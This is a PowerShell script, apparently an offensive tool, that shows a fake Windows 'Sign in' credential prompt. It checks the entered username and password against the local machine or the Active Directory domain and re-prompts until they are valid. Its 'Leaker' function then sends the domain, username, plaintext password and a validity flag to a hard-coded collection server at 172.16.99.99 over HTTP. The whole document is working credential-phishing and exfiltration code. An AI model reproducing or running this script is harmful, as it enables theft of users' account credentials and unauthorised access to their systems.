'''
'''
###########################################################################################################

# Prerequisites
Add-Type -AssemblyName System.Runtime.WindowsRuntime
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerResults,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.AuthenticationProtocol,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerOptions,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$CurrentDomain_Name = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME

# For our While loop
$status = $true


# There are 6 different authentication protocols supported. Can be seen here: https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.AuthenticationProtocol = 0
$options.Caption = "Sign in"
$options.Message = "Enter your credentials"
$options.TargetName = "1"
$working = "Working-No"


# CredentialPicker is using Async so we will need to use Await
function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}

function Leaker($domain,$username,$password,$working){
    try{
        Invoke-WebRequest http://172.16.99.99:80/$domain";"$username";"$password";"$working -Method GET -ErrorAction Ignore
        }
    catch{}
    }

function Credentials(){
    while ($status){
        
        # Where the magic happens
        $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        if (!$creds.CredentialPassword -or $creds.CredentialPassword -eq $null){
            Credentials
        }
        if (!$creds.CredentialUserName){
            Credentials
        }
        else {
            $Username = $creds.CredentialUserName;
            $Password = $creds.CredentialPassword;
            if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false -and ((Get-WmiObject -Class Win32_ComputerSystem).Workgroup -eq "WORKGROUP") -or (Get-WmiObject -Class Win32_ComputerSystem).Workgroup -ne $null){
                $domain = "WORKGROUP"
                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
                    Leaker($domain,$Username,$Password)
                    $status = $false
                    exit
                    }
                else {
                    leaker($CurrentDomain_Name,$username,$password,$working)
                    Credentials
                    }                
                }

            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
            if ($domain.name -eq $null){
                Credentials
            }
            else {
                $working = "Working-Yes"
                leaker($CurrentDomain_Name,$username,$password,$working)
                $status = $false
                exit
            }
        }
    }
}


Credentials
